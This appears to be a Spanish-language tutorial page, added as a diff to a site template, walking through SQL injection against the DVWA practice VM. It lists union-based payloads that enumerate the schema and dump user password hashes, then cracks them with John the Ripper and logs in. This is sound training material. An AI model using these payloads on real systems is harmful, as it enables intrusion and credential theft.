@@ -1,0 +1,285 @@
+{{% BLOCKS }}
+{{< master }}
+
+{{$ content}}
+
+<h2>SQL Injection</h2>
+
+<p>
+    Vamos a hacer pruebas con inyecciones de código <b>SQL</b> en una maquina virtual
+    de pruebas preparada para las mismas.
+</p>
+
+<p>
+    <a href="https://www.dropbox.com/s/1km8n8v5gzd6mxq/dvwa.7z?dl=1">Descargamos</a> la máquina virtual preparada para las pruebas y la montamos en <a href="https://www.virtualbox.org/">VirtualBox</a>.
+</p>
+
+<p><img src="/static/build/media/img/u2t2/vm.png" alt="sql-injection"></p>
+
+<p>
+    Para poder acceder a la máquina, configuramos la red en las preferencias
+    de <b>VirtualBox</b>, de la siguiente manera en nuestro caso:
+</p>
+
+<p><img src="/static/build/media/img/u2t2/conf01.png" alt="sql-injection"></p>
+<p><img src="/static/build/media/img/u2t2/conf02.png" alt="sql-injection"></p>
+
+<p>
+    Ahora ya tenemos acceso y entramos con <b>"username: admin"</b> y <b>"password: password"</b>:
+</p>
+
+<p><img src="/static/build/media/img/u2t2/1.png" alt="sql-injection"></p>
+
+<p>
+    Configuramos el nivel de seguridad para las pruebas:
+</p>
+
+<p><img src="/static/build/media/img/u2t2/2.png" alt="sql-injection"></p>
+
+<p>
+    Empezamos las pruebas, sabemos que la web ejecuta la siguiente consulta, a través de <b>PHP</b>,
+    donde la variable <b>$id</b> recoge el valor del formulario enviado:
+</p>
+
+<pre>
+$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
+</pre>
+
+<p>Al enviar <b>"1"</b> el resultado es:</p>
+<p><img src="/static/build/media/img/u2t2/3.png" alt="sql-injection"></p>
+
+<pre>%' or '0'='0</pre>
+<p><img src="/static/build/media/img/u2t2/4.png" alt="sql-injection"></p>
+
+<pre>%' or 0=0 union select null, version() #</pre>
+<p><img src="/static/build/media/img/u2t2/5.png" alt="sql-injection"></p>
+
+<pre>%' or 0=0 union select null, database() #</pre>
+<p><img src="/static/build/media/img/u2t2/7.png" alt="sql-injection"></p>
+
+<pre>%' and 1=0 union select null, table_name from information_schema.tables #</pre>
+<p><img src="/static/build/media/img/u2t2/8.png" alt="sql-injection"></p>
+
+<p>Resultado completo:</p>
+<pre>
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: CHARACTER_SETS
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: COLLATIONS
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: COLLATION_CHARACTER_SET_APPLICABILITY
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: COLUMNS
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: COLUMN_PRIVILEGES
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: ENGINES
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: EVENTS
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: FILES
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: GLOBAL_STATUS
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: GLOBAL_VARIABLES
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: KEY_COLUMN_USAGE
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: PARAMETERS
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: PARTITIONS
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: PLUGINS
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: PROCESSLIST
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: PROFILING
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: REFERENTIAL_CONSTRAINTS
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: ROUTINES
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: SCHEMATA
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: SCHEMA_PRIVILEGES
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: SESSION_STATUS
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: SESSION_VARIABLES
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: STATISTICS
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: TABLES
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: TABLESPACES
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: TABLE_CONSTRAINTS
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: TABLE_PRIVILEGES
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: TRIGGERS
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: USER_PRIVILEGES
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: VIEWS
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: INNODB_BUFFER_PAGE
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: INNODB_TRX
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: INNODB_BUFFER_POOL_STATS
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: INNODB_LOCK_WAITS
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: INNODB_CMPMEM
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: INNODB_CMP
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: INNODB_LOCKS
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: INNODB_CMPMEM_RESET
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: INNODB_CMP_RESET
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: INNODB_BUFFER_PAGE_LRU
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: guestbook
+
+ID: %' and 1=0 union select null, table_name from information_schema.tables #
+First name:
+Surname: users
+</pre>
+
+<pre>
+%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+</pre>
+<p><img src="/static/build/media/img/u2t2/9.png" alt="sql-injection"></p>
+
+<pre>
+%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
+</pre>
+<p><img src="/static/build/media/img/u2t2/10.png" alt="sql-injection"></p>
+
+<pre>
+%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
+</pre>
+<p><img src="/static/build/media/img/u2t2/11.png" alt="sql-injection"></p>
+
+<p>
+A través de esta última consulta sacamos los passwords de la base de datos, los cuales parecen estar en formato MD5.
+Los guardamos en un archivo "dvwa_passwords.txt" con el siguiente formato (username:password) preparado para pasarlos por <a href="http://www.openwall.com/john/">John The Ripper</a>:
+</p>
+
+<p><img src="/static/build/media/img/u2t2/dvwa_passwords.png" alt="sql-injection"></p>
+
+<p>
+    Descargamos una <a href="http://openwall.info/wiki/john/custom-builds#Compiled-for-Mac-OS-X">versión compilada de John The Ripper para nuestra versión de Mac OS X</a>, y ejecutamos:
+</p>
+
+<pre>
+$ ./john --format=raw-MD5 [ ruta a dvwa_passwords.txt ]
+</pre>
+
+<p><img src="/static/build/media/img/u2t2/john.png" alt="sql-injection"></p>
+
+<p>Vemos los passwords y usuarios de la base de datos:</p>
+
+<pre>
+password         (admin)
+password         (smithy)
+abc123           (gordonb)
+letmein          (pablo)
+charley          (1337)
+</pre>
+
+<p>
+    Salimos de la aplicación web y volvemos a entrar con uno de los usuarios
+    de los cuales hemos descubierto el password, en este caso <b>usuario:1337</b> con
+    <b>password:charley</b> :
+</p>
+
+<p><img src="/static/build/media/img/u2t2/login.png" alt="sql-injection"></p>
+
+{{/ content}}
+{{/ master }}
